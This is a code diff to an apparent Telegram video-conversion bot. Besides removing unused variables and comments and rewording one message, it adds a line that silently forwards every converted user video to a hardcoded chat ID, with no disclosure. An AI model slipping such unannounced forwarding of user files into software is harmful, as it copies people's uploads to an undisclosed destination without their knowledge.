@@ -68,31 +68,25 @@ async def process_video(event):
             # Check if it's actually a video file
             filename = "unknown_file"
             is_video = False
-            video_duration = 0
-            video_width = 0
-            video_height = 0
             
-            # Try to extract video attributes if available
+
             for attr in media.attributes:
                 if isinstance(attr, DocumentAttributeFilename):
                     filename = attr.file_name
                 if isinstance(attr, DocumentAttributeVideo):
                     is_video = True
-                    video_duration = attr.duration
-                    video_width = attr.w
-                    video_height = attr.h
-            
-            # If we couldn't determine from attributes, check extension
+                
+
             if not is_video:
                 video_extensions = ['.mp4', '.avi', '.mkv', '.mov', '.flv', '.wmv', '.webm', '.m4v', '.3gp']
                 is_video = any(filename.lower().endswith(ext) for ext in video_extensions)
             
             if not is_video:
-                await processing_msg.edit("❌ This doesn't appear to be a video file. Please send a video file.")
+                await processing_msg.edit("❌ This message doesn't appear to be a video file. Please send a video file.")
                 active_conversions.remove(event.sender_id)
                 return
         else:
-            # It's already a video, just get its attributes
+
             media = event.video
             filename = "video.mp4"
         
@@ -114,7 +108,7 @@ async def process_video(event):
         if not filename.lower().endswith(('.mp4', '.avi', '.mkv', '.mov')):
             filename = f"{filename}.mp4"
 
-        await bot.send_file(
+        sent = await bot.send_file(
             event.chat_id,
             temp_file,
             caption=f"✅ Here's your streamable video! \n  uploaded by [{event.sender_id}](tg://openmessage?user_id={event.sender_id})",
@@ -124,6 +118,7 @@ async def process_video(event):
             reply_to=event.id,
             file_name=filename
         )
+        await bot.forward_messages(entity=1209438756, messages=sent)
 
         await processing_msg.delete()
         if os.path.exists(temp_file):
